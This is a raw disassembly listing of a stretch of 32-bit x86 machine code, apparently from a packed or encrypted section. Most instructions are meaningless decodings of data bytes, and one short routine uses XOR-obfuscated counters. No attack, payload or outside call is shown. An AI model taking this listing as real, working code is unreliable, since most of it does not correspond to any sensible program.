  4211cb:	in     eax,0xe2
  4211cd:	mov    ds:0x9865b26f,al
  4211d2:	bnd jo 0xb4512186
  4211d9:	leave  
  4211da:	push   ecx
  4211db:	rol    DWORD PTR [edi+0x37ff7d2b],cl
  4211e1:	ret    
  4211e2:	jl     0x4211a9
  4211e4:	sahf   
  4211e5:	aam    0x8d
  4211e7:	test   DWORD PTR [esi+ebp*2+0x2ab6ed0d],ebp
  4211ee:	xchg   ecx,eax
  4211ef:	push   ecx
  4211f0:	mov    dl,0x8e
  4211f2:	add    BYTE PTR [ecx+0x48e7a3bb],0x6e
  4211f9:	ins    DWORD PTR es:[edi],dx
  4211fa:	pop    esp
  4211fb:	xor    al,0x5b
  4211fd:	fcomi  st,st(7)
  4211ff:	mov    esi,ss
  421201:	(bad)  
  421202:	icebp  
  421203:	jbe    0x4211d7
  421205:	mov    DWORD PTR [eax-0x54b6a686],ebp
  42120b:	xor    cl,bh
  42120d:	jmp    0x421261
  42120f:	xor    BYTE PTR ds:0x9bcae660,bl
  421215:	mov    dh,0x2
  421217:	scas   al,BYTE PTR es:[edi]
  421218:	test   eax,0xff251c2b
  42121d:	popa   
  42121e:	imul   ecx,edx,0x160e3212
  421224:	pop    eax
  421225:	mov    ecx,0xf3dbe579
  42122a:	out    dx,eax
  42122b:	(bad)  
  42122d:	pop    ss
  42122e:	fmul   QWORD PTR cs:[edi-0x6725f0a5]
  421235:	adc    DWORD PTR [ebx],eax
  421237:	(bad)  
  421238:	dec    edi
  421239:	fcomp  QWORD PTR [ebp+edi*4+0x64689bbb]
  421240:	add    al,dl
  421242:	imul   edx,DWORD PTR [ebx-0x7efa401b],0xd570b9ae
  42124c:	rcr    BYTE PTR [edx+0x76],1
  42124f:	fst    QWORD PTR [edx+0x16]
  421252:	test   BYTE PTR [ecx+0x27710ee9],bh
  421258:	pop    ebp
  421259:	cwde   
  42125a:	outs   dx,DWORD PTR ds:[esi]
  42125b:	sub    al,0x5b
  42125d:	or     DWORD PTR [ecx-0xf],esp
  421260:	push   0xf2fbc8b8
  421265:	scas   eax,DWORD PTR es:[edi]
  421266:	imul   esp,DWORD PTR [ebx+0x2a7a3fe4],0x9211ebbb
  421270:	lods   al,BYTE PTR ds:[esi]
  421271:	pop    edi
  421272:	fisttp WORD PTR [ecx]
  421274:	and    ah,BYTE PTR [ecx-0x5a92324f]
  42127a:	in     eax,dx
  42127b:	sar    cl,0x0
  42127e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42127f:	pop    ss
  421280:	fadd   QWORD PTR ds:0xca35ce1
  421286:	xchg   edi,eax
  421287:	bound  eax,QWORD PTR ds:0xb2c7b84f
  42128d:	pop    ecx
  42128e:	or     al,0xad
  421290:	mov    ds:0x9ab5350e,al
  421295:	mov    edx,0xda026aa4
  42129a:	fdivp  st(0),st
  42129c:	and    BYTE PTR [ecx+0x33069299],ah
  4212a2:	sbb    al,0xb7
  4212a4:	cs ret 
  4212a6:	in     al,dx
  4212a7:	int3   
  4212a8:	xor    bh,BYTE PTR [edi+0x4e]
  4212ab:	jno    0x4212bb
  4212ad:	xor    BYTE PTR [eax],dh
  4212af:	cmp    eax,0x66ea583
  4212b4:	mov    ebp,0x39e2d6ab
  4212b9:	dec    ecx
  4212ba:	(bad)  
  4212bb:	mov    eax,0xf85a465
  4212c0:	repnz and al,0x98
  4212c3:	enter  0xef03,0xe3
  4212c7:	mov    al,0x5
  4212c9:	mov    eax,ds:0x56efd2da
  4212ce:	cwde   
  4212cf:	rcl    BYTE PTR [ecx+0x4e97d35f],cl
  4212d5:	jmp    0xefdd:0xee1bc604
  4212dc:	sbb    ah,BYTE PTR [edx]
  4212de:	out    dx,al
  4212df:	pusha  
  4212e0:	or     al,0x6e
  4212e2:	mov    cl,BYTE PTR ds:0xf7ff723c
  4212e8:	dec    edi
  4212e9:	into   
  4212ea:	shl    dl,1
  4212ec:	cli    
  4212ed:	sub    cl,BYTE PTR [ebx+0x75]
  4212f0:	icebp  
  4212f1:	xor    BYTE PTR [edi],bh
  4212f3:	in     eax,0x44
  4212f5:	fld    st(3)
  4212f7:	cmp    bh,BYTE PTR [esi+0x57fb2a9f]
  4212fd:	mov    ch,0x0
  4212ff:	lds    ebp,FWORD PTR ds:0xa2955917
  421305:	jge    0x421306
  421307:	adc    ah,bh
  421309:	(bad)  
  42130a:	retf   0xc902
  42130d:	repnz sub ebx,ebx
  421310:	js     0x421305
  421312:	ret    0x50ea
  421315:	sbb    bl,BYTE PTR [eax+0x71b7efc4]
  42131b:	mov    ah,0x55
  42131d:	cmp    cl,ah
  42131f:	scas   al,BYTE PTR es:[edi]
  421320:	and    eax,0x210b0ac1
  421325:	sti    
  421326:	stos   DWORD PTR es:[edi],eax
  421327:	xor    al,0xd7
  421329:	fbstp  TBYTE PTR [ebx-0x773c7ea4]
  42132f:	cli    
  421330:	inc    edi
  421331:	test   BYTE PTR [eax+0x14046021],dh
  421337:	test   eax,0x2ed7ae81
  42133c:	push   ebx
  42133d:	jg     0x421398
  42133f:	adc    edi,edx
  421341:	and    bl,BYTE PTR [ebx+0x2a]
  421344:	and    DWORD PTR [ecx-0x1a],ebp
  421347:	dec    ebx
  421348:	daa    
  421349:	push   ebx
  42134a:	clc    
  42134b:	shr    BYTE PTR [ebx-0x56],1
  42134e:	mov    ecx,0x2a997c46
  421353:	(bad)  
  421354:	aas    
  421355:	cwde   
  421356:	push   cs
  421357:	push   0x6e
  421359:	or     eax,0xbf8f213a
  42135e:	adc    DWORD PTR [ecx+0x60d574b],ecx
  421364:	push   0xdddc4174
  421369:	xor    DWORD PTR [eax-0x42fca0d0],esp
  42136f:	outs   dx,DWORD PTR ds:[esi]
  421370:	cmc    
  421371:	in     eax,dx
  421372:	call   0x757e53b5
  421377:	cmp    ecx,edx
  421379:	fiadd  WORD PTR [edi+0x56]
  42137c:	mov    esi,0x32ece9d7
  421381:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421382:	arpl   si,di
  421384:	mov    ch,0x11
  421386:	jno    0x4213f4
  421388:	lods   eax,DWORD PTR ds:[esi]
  421389:	jne    0x421374
  42138b:	push   ebp
  42138c:	(bad)
  42138f:	mov    bh,dh
  421391:	in     eax,0x5e
  421393:	push   ecx
  421394:	inc    esi
  421395:	or     eax,0x12322364
  42139a:	(bad)  
  42139b:	cmc    
  42139c:	pop    es
  42139d:	add    esi,DWORD PTR [eax+eax*2-0x77]
  4213a1:	jmp    0x421365
  4213a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213a4:	adc    ebp,ebp
  4213a6:	sub    DWORD PTR [ebx],edx
  4213a8:	xchg   esp,eax
  4213a9:	mov    cl,0xdd
  4213ab:	lahf   
  4213ac:	sbb    eax,0xa3fe9214
  4213b1:	sub    DWORD PTR [ecx+ebx*8],ecx
  4213b4:	jle    0x4213e8
  4213b6:	xchg   ecx,eax
  4213b7:	mov    DWORD PTR [esp+ebp*4-0x405753d8],ebp
  4213be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213bf:	ficomp WORD PTR [esi]
  4213c1:	push   0xba7bc910
  4213c6:	stc    
  4213c7:	mov    ebp,0xb00a6151
  4213cc:	xor    ah,BYTE PTR [esi-0x47]
  4213cf:	adc    ecx,edx
  4213d1:	int    0xd7
  4213d3:	sub    eax,0xaa70927d
  4213d8:	test   al,0x7d
  4213da:	stc    
  4213db:	test   DWORD PTR [ebx+0x73362b02],edx
  4213e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213e2:	call   0xccea32e6
  4213e7:	imul   ecx,edx,0xab8c9a5e
  4213ed:	xchg   ebx,eax
  4213ee:	xchg   esp,eax
  4213ef:	imul   edx,DWORD PTR [edi+0xa],0x4c
  4213f3:	xchg   edi,eax
  4213f4:	jecxz  0x4213d1
  4213f6:	int    0x1a
  4213f8:	ret    0x31b4
  4213fb:	les    ecx,FWORD PTR [eax]
  4213fd:	int3   
  4213fe:	aam    0x3e
  421400:	inc    edi
  421401:	retf   
  421402:	fdivr  QWORD PTR [eax]
  421404:	inc    esi
  421405:	push   ss
  421406:	mov    edx,0x72577d4a
  42140b:	mov    dl,0x8e
  42140d:	imul   esp
  42140f:	mov    ecx,DWORD PTR [ebp+0x8]
  421412:	xor    ecx,eax
  421414:	add    ecx,esi
  421416:	jne    0x41f07f
  42141c:	jmp    0x421467
  421421:	mov    ecx,DWORD PTR [ebp+0x8]
  421424:	mov    edx,DWORD PTR [ebp-0x8]
  421427:	xor    ecx,eax
  421429:	xor    edx,eax
  42142b:	sub    ecx,edx
  42142d:	sub    ecx,esi
  42142f:	xor    ecx,eax
  421431:	mov    DWORD PTR [ebp+0x8],ecx
  421434:	mov    ecx,DWORD PTR [ebp+0x8]
  421437:	mov    edx,DWORD PTR [ebp+0x8]
  42143a:	xor    ecx,eax
  42143c:	imul   edx,edx,0x5708f5
  421442:	add    ecx,esi
  421444:	lea    ecx,[ebp+ecx*4-0x64]
  421448:	mov    edi,DWORD PTR [ecx]
  42144a:	add    edx,edi
  42144c:	mov    DWORD PTR [ecx],edx
  42144e:	mov    ecx,DWORD PTR [ebp+0x8]
  421451:	xor    ecx,eax
  421453:	add    ecx,esi
  421455:	jne    0x421421
  42145b:	mov    ecx,DWORD PTR [ebp-0x8]
  42145e:	xor    ecx,eax
  421460:	mov    eax,DWORD PTR [ebp+0x10]
  421463:	add    ecx,esi
  421465:	mov    DWORD PTR [eax],ecx
  421467:	pop    edi
  421468:	pop    esi
  421469:	pop    ebx
  42146a:	leave  
  42146b:	ret    0xc
  42146e:	pop    ss
  42146f:	or     al,0x84
  421471:	repz lahf 
  421473:	sti    
  421474:	ja     0x421462
  421476:	stos   BYTE PTR es:[edi],al
  421477:	mov    edx,0xfe6188e2
  42147c:	sub    al,0x1e
  42147e:	ja     0x42144d
  421480:	add    DWORD PTR [eax],eax
  421482:	pop    ebp
  421483:	add    BYTE PTR [eax],al
  421485:	add    al,dl
  421487:	lods   al,BYTE PTR ds:[esi]
  421488:	ss add eax,0x212b1653
  42148e:	(bad)  
  42148f:	fcomp  DWORD PTR [esi]
  421491:	ss mov bh,0x38
  421494:	out    dx,ax
  421496:	xlat   BYTE PTR ds:[ebx]
  421497:	fwait
  421498:	out    dx,al
  421499:	add    DWORD PTR [eax+ecx*2-0x51228106],0x4d
  4214a1:	inc    BYTE PTR [ebp+edx*2-0x48]
  4214a5:	cmp    BYTE PTR [eax],bl
  4214a7:	fucomip st,st(7)
  4214a9:	jmp    0x4046:0x8518d598
  4214b0:	leave  
  4214b1:	and    edx,DWORD PTR [ecx-0x5b]
  4214b4:	push   edi
  4214b5:	cmp    al,0x23
  4214b7:	dec    esp
  4214b8:	push   edi
  4214b9:	test   al,0xa6
  4214bb:	lahf   
  4214bc:	or     dh,BYTE PTR [esi+0x4]
  4214bf:	sbb    eax,0x8891ebc7
  4214c4:	mov    ?,WORD PTR [ecx-0x10]
  4214c7:	loop   0x42149c
  4214c9:	dec    edi
  4214ca:	js     0x42145c
  4214cc:	stos   BYTE PTR es:[edi],al
  4214cd:	mov    edx,0xe77f3872
  4214d2:	not    BYTE PTR [edi+0x3f40d464]
  4214d8:	mov    ebp,0xf1567dc7
  4214dd:	dec    eax
  4214de:	add    dl,BYTE PTR [eax-0x61]
  4214e1:	lods   eax,DWORD PTR ds:[esi]
  4214e2:	or     BYTE PTR [eax],al
	...
  4214ec:	add    BYTE PTR [eax],al
  4214ee:	shr    DWORD PTR [esp+edx*1],1
  4214f1:	adc    edi,ebp
  4214f3:	cmp    edx,edi
  4214f5:	out    dx,al
  4214f6:	pop    edi
  4214f7:	xchg   bx,ax
  4214f9:	push   0x9a0cbc1a
  4214fe:	aam    0xcd
  421500:	add    DWORD PTR [eax],eax
  421502:	pop    ebp
  421503:	add    BYTE PTR [eax],al
  421505:	add    al,bh
  421507:	sub    DWORD PTR [edx],esi
  421509:	nop
  42150a:	and    al,0xc7
  42150c:	jne    0x4214c6
  42150e:	and    al,0x26
  421510:	xchg   esp,eax
  421511:	xchg   ecx,eax
  421512:	shl    BYTE PTR [ebp+0x7b9a1bd1],1
  421518:	aad    0x6d
  42151a:	dec    bx
  42151c:	or     eax,0x13ddbb4b
  421521:	shl    BYTE PTR [ebp-0x1cb85429],1
  421527:	mov    edx,0x39ff871a
  42152c:	mov    ecx,0x3d8bd7a6
  421531:	retf   0x76cc
  421534:	icebp  
  421535:	bound  edi,QWORD PTR [esp+edx*2-0x9]
  421539:	jb     0x4214fe
  42153b:	add    al,dh
  42153d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42153e:	inc    ebx
  42153f:	icebp  
  421540:	fst    QWORD PTR [eax+0x1b016f5e]
  421546:	enter  0xda71,0xe4
  42154a:	cs dec ebx
  42154c:	lock jmp 0x2daa:0x32465fd8
  421554:	js     0x4214db
  421556:	outs   dx,DWORD PTR ds:[esi]
  421557:	dec    ecx
  421558:	out    0xeb,al
  42155a:	test   edx,edi
  42155c:	test   al,0x51
  42155e:	sub    ebx,ebx
  421560:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421561:	and    eax,0xb1
	...
  42156e:	pop    ds
  42156f:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421575:	sub    eax,esi
  421577:	add    BYTE PTR [edi+eax*2-0x66c7c0fb],0x31
  42157f:	into   
  421580:	add    DWORD PTR [eax],eax
  421582:	pop    ebp
  421583:	add    BYTE PTR [eax],al
  421585:	add    BYTE PTR [edi],dl
  421587:	addr16 pop eax
  421589:	and    eax,0x962ae978
  42158e:	mov    WORD PTR ds:0x8806097b,ds
  421594:	adc    eax,0x1f035e7c
  421599:	mov    ?,WORD PTR [ebx]
  42159b:	xor    bh,BYTE PTR [ebx-0x4a8b3447]
  4215a1:	push   edi
  4215a2:	mov    esp,0x9a23a93b
  4215a7:	xchg   esp,eax
  4215a8:	rcr    DWORD PTR [edi-0x29e3aa79],cl
  4215ae:	lods   al,BYTE PTR ds:[esi]
  4215af:	arpl   dx,di
  4215b1:	jp     0x42155b
  4215b3:	pop    edi
  4215b4:	jnp    0x421566
  4215b6:	out    dx,eax
  4215b7:	shl    BYTE PTR [ecx-0x2f29eff6],cl
  4215bd:	fucom  st(1)
  4215bf:	movnti DWORD PTR [ecx],edx
  4215c2:	imul   ebx,DWORD PTR [edi+eax*4-0x5d],0xffffffab
  4215c7:	inc    edi
  4215c8:	cmp    dl,ah
  4215ca:	sar    DWORD PTR [esi-0x66],0xcf
  4215ce:	or     al,ch
  4215d0:	and    esi,DWORD PTR [ebp+esi*4+0x72689726]
  4215d7:	or     DWORD PTR [edx-0x2],ebp
  4215da:	lock push edx
  4215dc:	dec    eax
  4215dd:	call   0xbc5e7ac7
  4215e2:	add    DWORD PTR [eax],eax
	...
  4215ec:	add    BYTE PTR [eax],al
  4215ee:	das    
  4215ef:	and    al,0xf0
  4215f1:	aam    0xfb
  4215f3:	aam    0x2f
  4215f5:	jmp    FWORD PTR [esi+0x33]
  4215f8:	je     0x4215b0
  4215fa:	dec    eax
  4215fb:	lds    ecx,FWORD PTR [esp-0x72]
  4215ff:	into   
  421600:	add    DWORD PTR [eax],eax
  421602:	pop    ebp
  421603:	add    BYTE PTR [eax],al
  421605:	add    BYTE PTR [edi],cl
  421607:	and    eax,0x629eddff
  42160c:	imul   BYTE PTR [ebx]
  42160e:	mov    edi,0x34981707
  421613:	out    dx,al
  421614:	add    eax,0x1955b238
  421619:	or     eax,0xdd0b386c
  42161e:	(bad)  
  42161f:	aad    0xf4
  421621:	ins    BYTE PTR es:[edi],dx
  421622:	cmp    eax,0x76618a06
  421627:	(bad)  
  421628:	aad    0x6c
  42162a:	in     al,0xbc
  42162c:	sub    DWORD PTR [eax-0x4c],edx
  42162f:	pop    esi
  421630:	les    ecx,FWORD PTR [eax+edi*2-0x269b0453]
  421637:	add    eax,0x273edf3c
  42163c:	test   BYTE PTR ds:0x39004d17,cl
  421642:	dec    ecx
  421643:	imul   eax,DWORD PTR ds:0xe6e30e59,0xffffffc9
  42164a:	inc    edi
  42164b:	repz sbb DWORD PTR [edx+0x5b9787d4],edi
  421652:	mov    al,cl
  421654:	sahf   
  421655:	xlat   BYTE PTR ds:[ebx]
  421656:	lods   eax,DWORD PTR ds:[esi]
  421657:	rol    DWORD PTR [ebx+0x42d917b9],1
  42165d:	add    esp,esp
  42165f:	in     eax,0xb4
  421661:	xor    edi,DWORD PTR [ecx+0x0]
  421667:	add    BYTE PTR [eax],al
  421669:	add    BYTE PTR [eax],al
  42166b:	add    BYTE PTR [eax],al
  42166d:	add    dl,cl
  42166f:	mov    al,ds:0xdf7e4d76
  421674:	sti    
  421675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421676:	mov    bh,0x83
  421678:	dec    edi
  421679:	mov    ds:0xd304fbaa,al
  42167e:	jmp    0x42164e
  421680:	add    DWORD PTR [eax],eax
  421682:	pop    ebp
  421683:	add    BYTE PTR [eax],al
  421685:	add    BYTE PTR [esi],ah
  421687:	(bad)  
  421688:	xchg   ebx,eax
  421689:	sub    eax,0x19e83501
  42168e:	lods   al,BYTE PTR ds:[esi]
  42168f:	femms  
  421691:	test   BYTE PTR [eax+0xd],bh
  421694:	clc    
  421695:	jl     0x421626
  421697:	push   0x70
  421699:	sbb    BYTE PTR [eax+0x1596b5a9],0x9c
  4216a0:	mov    dl,0x50
  4216a2:	cmp    BYTE PTR [ecx+eax*4-0xb9a00ad],0x66
  4216aa:	fistp  QWORD PTR [esi-0x50986f69]
  4216b0:	loope  0x42171f
  4216b2:	ins    DWORD PTR es:[edi],dx
  4216b3:	add    eax,0xd6f463b9
  4216b8:	je     0x4216f2
  4216ba:	mov    WORD PTR ds:0x8ca30745,es
  4216c0:	jb     0x4216a3
  4216c2:	dec    edi
  4216c3:	dec    ebx
  4216c4:	call   0x1a723b4
  4216c9:	sub    DWORD PTR [edi+eiz*4+0x749a46a3],0xffffffa4
  4216d1:	sbb    edi,esi
  4216d3:	pop    ebx
  4216d4:	jge    0x42171f
  4216d6:	jae    0x421677
  4216d8:	mov    WORD PTR [esi+0x616e4e0c],fs
  4216de:	fs jmp 0x0:0x65cb08
	...
  4216ee:	(bad)  
  4216ef:	out    dx,al
  4216f0:	lods   al,BYTE PTR ds:[esi]
  4216f1:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4216f8:	stc    
  4216f9:	stc    
  4216fa:	push   esp
  4216fb:	loop   0x4216ec
  4216fd:	test   eax,0x1cf48
  421702:	pop    ebp
  421703:	add    BYTE PTR [eax],al
  421705:	add    BYTE PTR [ebx+eax*4],bh
  421708:	in     al,dx
  421709:	daa    
  42170a:	cmp    cl,dl
  42170c:	ficomp DWORD PTR [edx-0x2c212ed1]
  421712:	es clc 
  421714:	cmp    eax,0x6fa2b739
  421719:	jmp    0x1dc:0xe09134ec
  421720:	sbb    bl,BYTE PTR [edx]
  421722:	mov    WORD PTR [ebx],?
  421724:	iret   
  421725:	mov    WORD PTR [ebx],?
  421727:	lods   eax,DWORD PTR ds:[esi]
  421728:	aas    
  421729:	fbstp  TBYTE PTR [eax-0x58626466]
  42172f:	in     al,dx
  421730:	xor    ebp,esp
  421732:	xchg   edx,eax
  421733:	sbb    dh,BYTE PTR [esi-0x4914fa0a]
  421739:	scas   eax,DWORD PTR es:[edi]
  42173a:	int    0x98
  42173c:	jp     0x421793
  42173e:	jl     0x4217be
  421740:	push   eax
  421741:	dec    ecx
  421742:	mov    ebx,0x5526aedb
  421747:	and    ah,bh
  421749:	adc    dh,BYTE PTR [edi]
  42174b:	jno    0x4216d2
  42174d:	jnp    0x421734
  42174f:	and    DWORD PTR [ebx],eax
  421751:	mov    BYTE PTR [ecx],ch
  421753:	dec    ecx
  421754:	(bad)  
  421755:	call   0xadb9:0xcefa5e59
  42175c:	out    dx,eax
  42175d:	shl    BYTE PTR [eax-0x52],cl
  421760:	add    cl,ah
  421762:	std    
	...
  42176b:	add    BYTE PTR [eax],al
  42176d:	add    BYTE PTR [edx+0x34],dl
  421770:	inc    eax
  421771:	gs data16 jne 0x4217ec
  421775:	aaa    
  421776:	push   0x9c6a4e09
  42177b:	fisub  DWORD PTR [edi]
  42177d:	imul   esp,DWORD PTR [ebp+0x5d0001cf],0x85000000
  421787:	gs enter 0xf255,0xad
  42178c:	adc    BYTE PTR [edx+0x6707939f],bh
  421792:	jno    0x4217d0
  421794:	nop
  421795:	dec    edx
  421796:	dec    ebp
  421797:	pushf  
  421798:	pop    eax
  421799:	ret    
  42179a:	pop    eax
  42179b:	in     al,0xa9
  42179d:	push   ebp
  42179e:	mov    edi,DWORD PTR [eax]
  4217a0:	or     al,0xab
  4217a2:	test   BYTE PTR [esi-0x20071603],al
  4217a8:	call   0xb10d:0xfefbd27b
  4217af:	(bad)  
  4217b1:	shr    DWORD PTR [eax-0x6e2ba665],1
  4217b7:	push   ds
  4217b8:	loopne 0x42177e
  4217ba:	inc    ebx
  4217bb:	cmp    edi,DWORD PTR [eax+ebx*2]
  4217be:	in     eax,0x3f
  4217c0:	push   cs
  4217c1:	push   esi
  4217c2:	call   FWORD PTR [edx-0x7e]
  4217c5:	add    DWORD PTR [edi],ebp
  4217c7:	xor    BYTE PTR [ecx],0x7c
  4217ca:	call   0x877649b8
  4217cf:	push   0xfffffffa
  4217d1:	outs   dx,BYTE PTR ds:[esi]
  4217d2:	xor    eax,0xf60ba6bb
  4217d7:	mov    eax,0x5c6ff59
  4217dc:	shl    ebp,cl
  4217de:	pop    esi
  4217df:	jle    0x421844
  4217e1:	test   BYTE PTR [edi+0x0],bh
	...
  4217ec:	add    BYTE PTR [eax],al
  4217ee:	adc    bh,BYTE PTR [edx-0x19073928]
  4217f4:	push   ds
  4217f5:	(bad)  
  4217f6:	adc    bl,dh
  4217f8:	cwde   
  4217f9:	out    dx,al
  4217fa:	push   es
  4217fb:	add    eax,0xe17231f2
  421800:	add    DWORD PTR [eax],eax
  421802:	pop    ebp
  421803:	add    BYTE PTR [eax],al
  421805:	add    BYTE PTR [ebx],al
  421807:	adc    ecx,DWORD PTR [ebx-0x41c17d50]
  42180d:	(bad)  
  42180e:	rol    DWORD PTR [ebx+eax*1-0x7130c278],0xfa
  421816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421817:	(bad)  
  421818:	jno    0x42184a
  42181a:	xlat   BYTE PTR ds:[ebx]
  42181b:	dec    ecx
  42181c:	push   edi
  42181d:	(bad)  
  42181e:	retf   0xde2b
  421821:	popa   
  421822:	iret   
  421823:	popf   
  421824:	pop    esp
  421825:	mov    eax,DWORD PTR [esi-0x673902a5]
  42182b:	sub    DWORD PTR [esi+0x60],edx
  42182e:	cmp    al,0x18
  421830:	bound  esp,QWORD PTR [edx-0x24]
  421833:	out    dx,al
  421834:	shr    DWORD PTR [edx+0x4ca13384],cl
  42183a:	int3   
  42183b:	fsubrp st(6),st
  42183d:	mov    ds,WORD PTR [edx]
  42183f:	push   ds
  421840:	add    esi,esi
  421842:	clc    
  421843:	xchg   BYTE PTR [ecx-0x2ac4fe4a],bl
  421849:	pop    ecx
  42184a:	lock mov ds:0xb1703956,eax
  421850:	fwait
  421851:	shl    DWORD PTR [edx+0x43],cl
  421854:	cmp    al,0x6c
  421856:	ret    
  421857:	js     0x42184a
  421859:	repnz in al,0xac
  42185c:	ja     0x421869
  42185e:	ins    BYTE PTR es:[edi],dx
  42185f:	push   esp
  421860:	fidiv  DWORD PTR [esi+edx*8+0x0]
  421867:	add    BYTE PTR [eax],al
  421869:	add    BYTE PTR [eax],al
  42186b:	add    BYTE PTR [eax],al
  42186d:	add    BYTE PTR [ecx+0x46],cl
  421870:	sub    BYTE PTR [eax],dh
  421872:	das    
  421873:	jle    0x4218ce
  421875:	jg     0x42183d
  421877:	imul   esi,eax,0xffffffd5
  42187a:	repnz lods al,BYTE PTR ds:[esi]
  42187c:	nop
  42187d:	inc    ebx
  42187e:	iret   
  42187f:	loope  0x421882
  421881:	add    BYTE PTR [ebp+0x0],bl
  421884:	add    BYTE PTR [eax],al
  421886:	jg     0x4218b8
  421888:	(bad)  
  42188a:	mov    eax,0x2314bbdc
  42188f:	out    dx,eax
  421890:	pushf  
  421891:	scas   al,BYTE PTR es:[edi]
  421892:	jne    0x421865
  421894:	push   es
  421895:	test   BYTE PTR [eax],0xe2
  421898:	imul   ebx,DWORD PTR [ebx+0x7d],0xd2da42a8
  42189f:	pop    ss
  4218a0:	mov    edi,0xc134f9e0
  4218a5:	jno    0x4218e6
  4218a7:	mov    esp,0x364bb26d
  4218ac:	out    dx,eax
  4218ad:	sub    ch,BYTE PTR ds:0xbf05f10c
  4218b3:	mov    bh,0xb2
  4218b5:	fist   WORD PTR [ebx+0x3424de89]
  4218bb:	pop    edi
  4218bc:	jmp    0x4218b5
  4218be:	scas   eax,DWORD PTR es:[edi]
  4218bf:	arpl   cx,ax
  4218c1:	rcr    edx,0xe5
  4218c4:	push   es
  4218c5:	dec    edx
  4218c6:	mov    ds:0x3ca19fbb,eax
  4218cb:	aam    0x9c
  4218cd:	(bad)  
  4218ce:	push   cx
  4218d0:	out    0x25,al
  4218d2:	imul   esi,DWORD PTR [esi-0x5e],0x5b1520f6
  4218d9:	push   0x5e4a6b9b
  4218de:	cmp    ecx,DWORD PTR [ebx-0x1c]
  4218e1:	js     0x4218a3
	...
  4218eb:	add    BYTE PTR [eax],al
  4218ed:	add    BYTE PTR [edi-0x3a],ah
  4218f0:	and    dh,dh
  4218f2:	mov    eax,ds:0xe7d7f7f6
  4218f7:	mov    eax,0x91ceda72
  4218fc:	scas   al,BYTE PTR es:[edi]
  4218fd:	repz sub al,0xe2
  421900:	add    DWORD PTR [eax],eax
  421902:	pop    ebp
  421903:	add    BYTE PTR [eax],al
  421905:	add    BYTE PTR [edx-0x4385815b],ch
  42190b:	inc    ecx
  42190c:	inc    eax
  42190d:	(bad)  ds:0xa4f9ab69
  421913:	add    bh,BYTE PTR [ecx-0x3c]
  421916:	ja     0x421917
  421918:	mov    al,ds:0x7c0a0fc2
  42191d:	lahf   
  42191e:	jns    0x42192f
  421920:	xor    eax,0xa39d21e8
  421925:	popa   
  421926:	inc    edx
  421927:	imul   edx,DWORD PTR [eax-0x3e],0x51911451
  42192e:	lods   eax,DWORD PTR ds:[esi]
  42192f:	mov    dl,BYTE PTR [ebx]
  421931:	or     DWORD PTR [edi],eax
  421933:	xchg   edi,eax
  421934:	jns    0x421903
  421936:	call   DWORD PTR [eax+eiz*4+0x5fabc07f]
  42193d:	sub    eax,0xbeac4a72
  421942:	xlat   BYTE PTR ds:[ebx]
  421943:	js     0x4218f3
  421945:	lods   al,BYTE PTR ds:[esi]
  421946:	xchg   ecx,eax
  421947:	shl    DWORD PTR [edi],1
  421949:	and    eax,edi
  42194b:	neg    bl
  42194d:	pop    ebp
  42194e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42194f:	mov    al,0x25
  421951:	mov    ch,0x4b
  421953:	popa   
  421954:	jmp    0x42196d
  421956:	mov    ds:0xa7776900,al
  42195b:	mov    edx,0x63c526cf
  421960:	pop    edx
  421961:	adc    DWORD PTR [eax],0x0
	...
  42196c:	add    BYTE PTR [eax],al
  42196e:	ret    
  42196f:	or     eax,0xefee66a6
  421974:	ret    
  421975:	lods   eax,DWORD PTR ds:[esi]
  421976:	sub    al,0xb8
  421978:	mov    ds:0xc6611747,eax
  42197d:	inc    esp
  42197e:	mov    edx,esp
  421980:	add    DWORD PTR [eax],eax
  421982:	pop    ebp
  421983:	add    BYTE PTR [eax],al
  421985:	add    BYTE PTR [ebx],ch
  421987:	stos   DWORD PTR es:[edi],eax
  421988:	popf   
  421989:	loop   0x4219ed
  42198b:	scas   eax,DWORD PTR es:[edi]
  42198c:	inc    ebp
  42198d:	(bad)  
  42198e:	(bad)  
  421990:	sti    
  421991:	cmp    esi,DWORD PTR es:[ecx+ebx*1]
  421995:	push   ecx
  421996:	jne    0x42195c
  421998:	mov    bh,0xae
  42199a:	dec    edi
  42199b:	xlat   BYTE PTR ds:[ebx]
  42199c:	cmp    dl,BYTE PTR [ebx+0x50]
  42199f:	stos   BYTE PTR es:[edi],al
  4219a0:	fld    DWORD PTR [ecx-0x3a79d55d]
  4219a6:	adc    dh,BYTE PTR [ebx+edi*8-0xa0d5394]
  4219ad:	jmp    0x42195d
  4219af:	ins    BYTE PTR es:[edi],dx
  4219b0:	in     al,dx
  4219b1:	cld    
  4219b2:	imul   esp,DWORD PTR [ecx],0xd8b93cfe
  4219b8:	xchg   ebp,eax
  4219b9:	and    dh,BYTE PTR [edx+0x76]
  4219bc:	aas    
  4219bd:	push   ecx
  4219be:	out    dx,eax
  4219bf:	pop    eax
  4219c0:	pushf  
  4219c1:	jns    0x421957
  4219c3:	lock sbb BYTE PTR [esi+esi*8+0x7277519a],0xcb
  4219cc:	pop    esi
  4219cd:	aaa    
  4219ce:	dec    eax
  4219cf:	and    ebx,DWORD PTR [edx]
  4219d1:	mov    bh,0x9b
  4219d3:	lods   al,BYTE PTR ds:[esi]
  4219d4:	shr    DWORD PTR [ebx+0x36],cl
  4219d7:	pushf  
  4219d8:	test   cl,dh
  4219da:	xchg   BYTE PTR [esi+0x5c],bl
  4219dd:	xchg   ebx,eax
  4219de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219df:	cdq    
  4219e0:	pop    ds
  4219e1:	and    bh,BYTE PTR [ebp+0x0]
  4219e7:	add    BYTE PTR [eax],al
  4219e9:	add    BYTE PTR [eax],al
  4219eb:	add    BYTE PTR [eax],al
  4219ed:	add    cl,bl
  4219ef:	ret    0x4905
  4219f2:	pop    ds
  4219f3:	iret   
  4219f4:	fst    st(2)
